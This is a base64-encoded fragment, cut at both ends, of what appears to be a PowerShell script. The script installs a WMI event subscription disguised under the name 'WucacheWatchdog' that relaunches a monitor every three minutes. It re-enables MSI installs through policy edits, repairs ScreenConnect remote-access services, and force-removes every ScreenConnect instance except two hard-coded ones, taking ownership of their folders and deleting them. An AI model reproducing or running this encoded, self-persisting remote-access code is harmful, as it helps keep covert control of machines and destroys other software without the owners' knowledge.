YWlsIgp9CgpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cgewogICAgZm9yZWFjaCAoJGNscyBpbiBA
KCdfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nJywnX19FdmVudEZpbHRlcicsJ0NvbW1hbmRMaW5l
RXZlbnRDb25zdW1lcicsJ19fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uJykpIHsKICAgICAgICBH
ZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzICRjbHMgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3Qgewog
ICAgICAgICAgICAgICAgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dGJykgLW9yICgkXy5O
YW1lIC1lcSAnV3VjYWNoZVdhdGNoZG9nQycpIC1vcgogICAgICAgICAgICAgICAgKCRfLlRpbWVy
SWQgLWVxICdXdWNhY2hlV2F0Y2hkb2cnKSAtb3IKICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIg
LWFuZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykgLW9y
CiAgICAgICAgICAgICAgICAoJF8uQ29uc3VtZXIgLWFuZCAkXy5Db25zdW1lci5Ub1N0cmluZygp
IC1saWtlICcqV3VjYWNoZVdhdGNoZG9nQyonKQogICAgICAgICAgICB9IHwgRm9yRWFjaC1PYmpl
Y3QgeyAkXy5EZWxldGUoKSB8IE91dC1OdWxsIH0KICAgIH0KfQoKZnVuY3Rpb24gSW5zdGFsbC1X
YXRjaGRvZyB7CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0KICAgIFJl
bW92ZS1XYXRjaGRvZwogICAgJG9rID0gJHRydWUKICAgIHRyeSB7CiAgICAgICAgU2V0LVdtaUlu
c3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1l
ckluc3RydWN0aW9uIGAKICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2Fj
aGVXYXRjaGRvZyc7IEludGVydmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQg
PSAkZmFsc2UgfSB8IE91dC1OdWxsCiAgICAgICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVz
cGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgCiAgICAgICAgICAg
IC1Bcmd1bWVudHMgQHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dGJzsgRXZlbnROYW1lc3BhY2Ug
PSAncm9vdFxjaW12Mic7IFF1ZXJ5TGFuZ3VhZ2UgPSAnV1FMJzsKICAgICAgICAgICAgICAgICAg
ICAgICAgICBRdWVyeSA9ICJTRUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklk
PSdXdWNhY2hlV2F0Y2hkb2cnIiB9CiAgICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVz
cGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGAK
ICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0MnOyBDb21t
YW5kTGluZVRlbXBsYXRlID0gImNtZC5leGUgL2MgYCIkTW9uUGF0aGAiIjsgUnVuSW50ZXJhY3Rp
dmVseSA9ICRmYWxzZSB9CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxz
dWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYAogICAgICAgICAg
ICAtQXJndW1lbnRzIEB7IEZpbHRlciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbAog
ICAgfSBjYXRjaCB7ICRvayA9ICRmYWxzZSB9CiAgICByZXR1cm4gJG9rCn0KCmZ1bmN0aW9uIFRl
c3QtV2F0Y2hkb2dHcmFwaCB7CiAgICAkdCA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290
XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gLUZpbHRlciAi
VGltZXJJZD0nV3VjYWNoZVdhdGNoZG9nJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUK
ICAgICRmID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFz
cyBfX0V2ZW50RmlsdGVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0YnIiAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ug
cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVy
ICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUK
ICAgICRiID0gJG51bGwKICAgIGlmICgkZiAtYW5kICRjKSB7CiAgICAgICAgJGIgPSBHZXQtV21p
T2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25z
dW1lckJpbmRpbmcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBX
aGVyZS1PYmplY3QgeyAkXy5GaWx0ZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dGKicgLWFuZCAk
Xy5Db25zdW1lciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJyB9IHwKICAgICAgICAgICAgU2Vs
ZWN0LU9iamVjdCAtRmlyc3QgMQogICAgfQogICAgcmV0dXJuIFtib29sXSgkdCAtYW5kICRmIC1h
bmQgJGMgLWFuZCAkYikKfQoKZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsKICAgIGlmIChUZXN0
LVdhdGNoZG9nR3JhcGgpIHsgcmV0dXJuICdPSycgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsg
cmV0dXJuICdNSVNTSU5HJyB9CiAgICBpZiAoSW5zdGFsbC1XYXRjaGRvZykgeyByZXR1cm4gJ1JF
QVJNRUQnIH0KICAgIHJldHVybiAnRkFJTCcKfQoKIyBDb3JyZWN0IDMyLWJpdCArIDY0LWJpdCBB
UlAgaGl2ZXMuIEw2IGFuZCBlYXJsaWVyIHVzZWQgYSB0cnVuY2F0ZWQKIyBXT1c2NDMyTm9kZSBw
YXRoIChtaXNzaW5nIE1pY3Jvc29mdFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVj
dAojIHdhcyBpbnZpc2libGUgdG8gcmVwYWlyL2V4dGVybWluYXRlL3JlZ2lzdGVyZWQuCiRzY3Jp
cHQ6VW5pbnN0YWxsUm9vdHMgPSBAKAogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsCiAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQz
Mk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJwopCgpmdW5j
dGlvbiBUZXN0LVNDUmVnaXN0ZXJlZChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBMODog
TkVWRVIgdXNlIHJldHVybiBpbnNpZGUgRm9yRWFjaC1PYmplY3QgLSBpdCBvbmx5IGV4aXRzIHRo
ZQogICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlzIGZlbGwg
dGhyb3VnaCB0byAnbm8nCiAgICAjIGFuZCB0aGUgbW9uIG9ycGhhbi1sYWRkZXIgZGVsZXRlZCBo
ZWFsdGh5IHJlZ2lzdGVyZWQgc2VydmljZXMuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsg
cmV0dXJuICdubycgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJw
cmludCkiCiAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAg
ICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZv
cmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUpKSB7CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQ
YXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAg
ICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1s
aWtlICd7Kn0nKSkgeyByZXR1cm4gJ3llcycgfQogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAn
bm8nCn0KCmZ1bmN0aW9uIFJlcGFpci1TQ1NlcnZpY2UoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsK
ICAgICMgUmVjcmVhdGVzIGEgZGVsZXRlZCBTQyBzZXJ2aWNlIGVudHJ5IGJ5IHJlcGFpcmluZyB0
aGUgUkVHSVNURVJFRCBwcm9kdWN0LgogICAgIyBtc2lleGVjIC9mYSB7R1VJRH0gcmVwYWlycyBp
biBwbGFjZSAtIGl0IGRvZXMgTk9UIHJ1biB0aGUgU0MtZmFtaWx5CiAgICAjIG1ham9yLXVwZ3Jh
ZGUgcmVtb3ZhbCwgc28gb3RoZXIgaW5zdGFuY2VzIGFyZSB1bnRvdWNoZWQuCiAgICAjIEw1OiBh
bHNvIGhhbmRsZXMgcHJlc2VudC1idXQtU1RPUFBFRCBzZXJ2aWNlcyAocmVwYWlyIHJlc3RvcmVz
IGJpbmFyaWVzLAogICAgIyB0aGVuIHN0YXJ0KS4gT25seSBhIFJ1bm5pbmcgc2VydmljZSBpcyBj
b25zaWRlcmVkIGhlYWx0aHkuCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdu
by1mcCcgfQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVxICdSdW5uaW5nJykgeyBy
ZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9CiAgICAkZ3VpZCA9ICRudWxsCiAgICBmb3JlYWNoICgkcm9v
dCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0
aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGls
ZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAg
ICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgKCRkbiAtaWVx
ICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkgeyAkZ3VpZCA9ICRr
ZXkuUFNDaGlsZE5hbWU7IGJyZWFrIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRndWlkKSB7IGJy
ZWFrIH0KICAgIH0KICAgIGlmICgtbm90ICRndWlkKSB7IHJldHVybiAnbm90LXJlZ2lzdGVyZWQn
IH0KICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0
XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBPdXQtTnVsbAogICAg
JiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJ
bnN0YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1O
dWxsCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICJtc2lfcmVwYWlyXyRGaW5nZXJwcmlu
dC5sb2ciCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAi
L2ZhICRndWlkIC9xbiAvbm9yZXN0YXJ0IC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQog
ICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgOAogICAgJiBzYy5leGUgY29uZmlnICIkbmFtZSIgc3Rh
cnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEg
fCBPdXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNAogICAgJHN2YyA9IEdldC1TZXJ2
aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2
YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVzdG9yZWQg
ZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQogICAgaWYgKCRzdmMpIHsgcmV0dXJuICJzdmMtc3RpbGwt
c3RvcHBlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICByZXR1cm4gInN2Yy1zdGlsbC1taXNz
aW5nIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCn0KCmZ1bmN0aW9uIEludm9rZS1FeHRlcm1pbmF0ZSB7
CiAgICAjIEw3OiB0cnVlIHJlbW92YWwuIENvcnJlY3QgV09XNjQzMk5vZGUgaGl2ZSArIG1zaWV4
ZWMgKyBVbmluc3RhbGxTdHJpbmcKICAgICMgZmFsbGJhY2sgKyBmb3JjZSBkaXIgbnVrZS4gS2Vl
cCBvbmx5IHRoZSB0d28gYWxsb3dsaXN0ZWQgZmluZ2VycHJpbnRzLgogICAgJGxvZyA9IEpvaW4t
UGF0aCAkV29ya0RpciAnZXh0ZXJtaW5hdGUubG9nJwogICAgJGtlZXAgPSBAKCc1ZjYwMTA1Nzk4
NTJlNTA3JywnZjg2MWM4MTQwZDQ1MzQyNycpCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAw
OyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAgZnVuY3Rpb24g
TG9nKFtzdHJpbmddJG0pIHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAoR2V0LURhdGUg
LUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgICAgIFdyaXRlLU91dHB1dCAkbGluZQogICAgfQogICAgZnVuY3Rpb24gSXMtS2VlcGVy
KFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAg
ICAgICBmb3JlYWNoICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVy
biAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBmdW5jdGlvbiBGb3Jj
ZS1SZW1vdmVEaXIoW3N0cmluZ10kZCkgewogICAgICAgIGlmICgtbm90ICRkIC1vciAtbm90IChU
ZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIEdldC1D
aW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwK
ICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5FeGVj
dXRhYmxlUGF0aC5TdGFydHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJZ25v
cmVDYXNlKSB9IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBTdG9wLVByb2Nlc3MgLUlk
ICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQogICAg
ICAgICYgdGFrZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAm
IGljYWNscy5leGUgJGQgL2dyYW50ICcqUy0xLTUtMzItNTQ0OkYnIC9UIC9DIC9RIDI+JjEgfCBP
dXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3JzOkYn
IC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0
aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAg
ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICBjbWQuZXhlIC9j
ICJhdHRyaWIgLWggLXMgLXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgICAgIGNtZC5leGUgL2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91dC1OdWxsCiAg
ICAgICAgfQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAg
ICAgICRlbXB0eSA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6
TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBE
aXJlY3RvcnkgLVBhdGggJGVtcHR5IC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgICAgICYgcm9i
b2NvcHkuZXhlICRlbXB0eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwKICAgICAg
ICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRk
IC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIH0K
ICAgICAgICByZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkKICAgIH0KICAg
IGZ1bmN0aW9uIFVuaW5zdGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsKICAgICAgICAkZ3VpZCA9ICRr
ZXkuUFNDaGlsZE5hbWUKICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1Bh
dGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAkZG4gPSAkcHJvcC5EaXNw
bGF5TmFtZQogICAgICAgIGlmICgkZ3VpZCAtbGlrZSAneyp9JykgewogICAgICAgICAgICAkcCA9
IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9u
b3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0
eWxlIEhpZGRlbgogICAgICAgICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRn
dWlkIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgIGlmICgkcC5FeGl0Q29kZSAtaW4g
MCwgMTYwNSwgMTYxNCwgMzAxMCkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIH0KICAgICAgICAk
dXMgPSAkcHJvcC5Vbmluc3RhbGxTdHJpbmcKICAgICAgICBpZiAoJHVzKSB7CiAgICAgICAgICAg
IHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7CiAg
ICAgICAgICAgICAgICAgICAgJGFyZ3MgPSAoJHVzIC1yZXBsYWNlICcoP2kpXi4qbXNpZXhlYyhc
LmV4ZSk/XHMqJywgJycpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1ub3RtYXRjaCAn
L3FuJykgeyAkYXJncyA9ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQogICAgICAgICAgICAgICAg
ICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1X
YWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9n
ICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19tc2kgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIK
ICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0
LCAzMDEwKQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcCA9
IFN0YXJ0LVByb2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyAkdXMgL1MgL3NpbGVudCAv
cXVpZXQgL3FuIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAg
ICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5dIGV4aXQ9JCgk
cC5FeGl0Q29kZSkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29kZSAtZXEg
MCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVjdF91
bmluc3RhbGxzdHJpbmdfRkFJTCBbJGRuXSAkXyIgfQogICAgICAgIH0KICAgICAgICByZXR1cm4g
JGZhbHNlCiAgICB9CgogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVfTDdfYmVnaW4nCgogICAg
IyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0IEFSUCBoaXZlcwogICAg
JHNlZW4gPSBAe30KICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMp
IHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2lu
ZyAkcm9vdCI7IGNvbnRpbnVlIH0KICAgICAgICBMb2cgImhpdmVfc2NhbiAkcm9vdCIKICAgICAg
ICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9y
RWFjaC1PYmplY3QgewogICAgICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJF8uUFNQ
YXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRkbiA9ICRwcm9w
LkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4gfQogICAgICAg
ICAgICBpZiAoJGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChb
MC05QS1GYS1mXXsxNn0pXCknKSB7IHJldHVybiB9CiAgICAgICAgICAgICRmcCA9ICRNYXRjaGVz
WzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQog
ICAgICAgICAgICBpZiAoJHNlZW4uQ29udGFpbnNLZXkoJF8uUFNDaGlsZE5hbWUpKSB7IHJldHVy
biB9CiAgICAgICAgICAgICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlCiAgICAgICAgICAg
IGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsgJG4u
ZmFpbCsrOyBMb2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQogICAgICAgIH0KICAg
IH0KCiAgICAjIDIuIGZvcmVpZ24gU0Mgc2VydmljZXMKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
dC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsg
JF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgewogICAgICAgIGlmIChJ
cy1LZWVwZXIgJHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0KICAgICAgICAmIHNjLmV4ZSBzdG9wICIk
KCRzdmMuTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNl
Y29uZHMgNjAwCiAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+JjEgfCBP
dXQtTnVsbAogICAgICAgICRuLnN2YysrOyBMb2cgInN2Y19kZWxldGVkICQoJHN2Yy5OYW1lKSIK
ICAgIH0KCiAgICAjIDMuIGZvcmVpZ24gU0MgcHJvY2Vzc2VzIChraWxsIGV2ZW4gd2hlbiBFeGVj
dXRhYmxlUGF0aCBpcyBudWxsKQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZp
bHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRleGUgPSAkXy5FeGVjdXRhYmxlUGF0
aAogICAgICAgICRjbWQgPSAkXy5Db21tYW5kTGluZQogICAgICAgICRrZWVwZXIgPSAoSXMtS2Vl
cGVyICRleGUpIC1vciAoSXMtS2VlcGVyICRjbWQpCiAgICAgICAgaWYgKC1ub3QgJGtlZXBlcikg
ewogICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgJG4ucHJvYysrOyBMb2cgInByb2Nf
a2lsbGVkIHBpZD0kKCRfLlByb2Nlc3NJZCkgZXhlPSRleGUiCiAgICAgICAgfQogICAgfQoKICAg
ICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMgKFBGICsgUEY4NikKICAgIGZvcmVhY2ggKCRi
YXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSkpIHsK
ICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNlKSkgeyBjb250
aW51ZSB9CiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9y
eSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVy
ZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8IEZvckVhY2gtT2Jq
ZWN0IHsKICAgICAgICAgICAgICAgICRkID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgIGlm
IChJcy1LZWVwZXIgJGQpIHsgcmV0dXJuIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1v
dmVEaXIgJGQpIHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAgICAg
ICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0KICAgICAg
ICAgICAgfQogICAgfQoKICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gLyByZW1vdGUtYWNjZXNzIHRv
